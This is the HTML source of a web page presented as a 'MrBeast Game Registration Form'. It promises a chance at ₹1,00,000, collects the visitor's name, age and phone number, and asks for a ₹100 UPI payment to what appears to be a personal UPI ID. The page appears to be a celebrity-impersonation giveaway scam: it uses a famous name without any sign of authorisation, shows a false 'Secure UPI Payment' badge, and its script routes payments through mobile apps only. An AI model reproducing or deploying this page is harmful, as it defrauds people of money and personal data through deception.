<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MrBeast Registration</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: url('background.jpg') no-repeat center center/cover;
    }

    .container {
      background: rgba(0, 0, 0, 0.55);
      padding: 35px;
      border-radius: 20px;
      box-shadow: 0 6px 35px rgba(0,0,0,0.6);
      max-width: 450px;
      width: 100%;
      text-align: center;
      border: 1px solid rgba(255,255,255,0.15);
      backdrop-filter: blur(6px);
    }

    .logo {
      width: 110px;
      margin: 0 auto 15px;
    }

    .headline {
      font-size: 26px;
      font-weight: 900;
      background: linear-gradient(90deg, #d4af37, #f1c40f, #d4af37);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-transform: uppercase;
      margin-bottom: 8px;
      text-shadow: 0 0 12px rgba(212,175,55,0.7);
    }

    .sub {
      font-size: 15px;
      font-weight: 600;
      letter-spacing: 1px;
      color: #ddd;
      margin-bottom: 18px;
    }

    h2 {
      color: #fff;
      margin-bottom: 15px;
    }

    label {
      font-weight: 600;
      display: block;
      margin: 10px 0 5px;
      text-align: left;
      color: #eee;
    }

    input {
      width: 100%;
      padding: 12px;
      border: 1px solid rgba(255,255,255,0.3);
      border-radius: 10px;
      margin-bottom: 15px;
      font-size: 15px;
      background: rgba(255,255,255,0.08);
      color: #fff;
      outline: none;
      transition: 0.3s;
    }

    input:focus {
      border-color: #f1c40f;
      box-shadow: 0 0 8px rgba(241,196,15,0.7);
    }

    ::placeholder {
      color: #bbb;
    }

    .pay-btn {
      display: inline-block;
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #007bff, #0056b3);
      color: #fff;
      font-size: 17px;
      font-weight: bold;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      text-decoration: none;
      transition: 0.3s;
      box-shadow: 0 4px 15px rgba(0,123,255,0.5);
    }

    .pay-btn:hover {
      background: linear-gradient(135deg, #0056b3, #003f88);
      transform: translateY(-2px);
    }

    .pay-btn.disabled {
      background: #666;
      cursor: not-allowed;
      box-shadow: none;
    }

    .qr-box {
      margin-top: 20px;
      color: #fff;
    }

    .qr-box img {
      width: 180px;
      border: 3px solid #eee;
      border-radius: 12px;
      background: transparent;
    }

    .secure {
      margin-top: 10px;
      font-size: 13px;
      color: #28a745;
      font-weight: 600;
    }

    .notice {
      font-size: 14px;
      color: #ffcc00;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Use a transparent PNG logo here -->
    <img src="your-logo-transparent.png" alt="Logo" class="logo">

    <div class="headline">Get a Chance to Win ₹1,00,000!</div>
    <div class="sub">MrBeast Game Registration Form</div>

    <h2>Register & Pay ₹100</h2>

    <p style="color:#ccc; font-size: 14px; margin-top: 0; margin-bottom: 10px;">
      📱 <strong>UPI payments only.</strong> Use Google Pay, PhonePe, Paytm, etc.
    </p>

    <form>
      <label for="name">Full Name</label>
      <input type="text" id="name" placeholder="Enter your full name" required>

      <label for="age">Age</label>
      <input type="number" id="age" placeholder="Enter your age" required>

      <label for="phone">Phone Number</label>
      <input type="tel" id="phone" placeholder="Enter your phone number" required>

      <a href="upi://pay?pa=8469626550@fam&pn=mrbeast&am=100&cu=INR" class="pay-btn" id="upiPayBtn">
        Pay ₹100 & Register
      </a>

      <p class="notice" id="deviceWarning" style="display: none;">
        ⚠️ UPI payments can only be done via mobile apps. Please open this page on your phone.
      </p>
    </form>

    <div class="qr-box">
      <p>Or scan to pay:</p>
      <img src="qr.png" alt="UPI QR">
    </div>

    <div class="secure">🔒 Secure UPI Payment</div>
  </div>

  <script>
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const upiBtn = document.getElementById('upiPayBtn');
    const warning = document.getElementById('deviceWarning');

    if (!isMobile) {
      upiBtn.classList.add('disabled');
      upiBtn.removeAttribute('href');
      upiBtn.innerText = 'Open on Mobile to Pay via UPI';
      warning.style.display = 'block';
    }
  </script>
</body>
</html>
